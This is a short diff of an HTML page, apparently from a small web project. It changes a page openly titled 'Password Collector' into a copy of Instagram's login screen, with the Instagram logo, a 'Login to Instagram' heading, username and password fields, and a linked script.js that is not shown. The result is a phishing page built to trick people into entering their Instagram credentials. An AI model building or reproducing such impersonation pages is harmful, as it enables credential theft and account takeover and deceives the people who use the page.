@@ -3,21 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Password Collector</title>
+    <title>Instagram Login</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
     <div class="container">
-        <h1>Join the Club!</h1>
-        <p>Unlock exclusive benefits by entering your username and password. You'll get 5rs just for signing up! 🎉</p>
-        <form id="passwordForm">
-            <label for="username">Username:</label>
-            <input type="text" id="username" name="username" required>
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password" required>
-            <button type="submit">Submit</button>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png" alt="Instagram Logo" class="logo">
+        <h1>Login to Instagram</h1>
+        <form id="loginForm">
+            <input type="text" id="username" name="username" placeholder="Username" required>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+            <button type="submit">Login</button>
         </form>
-        <div id="message"></div>
     </div>
     <script src="script.js"></script>
 </body>
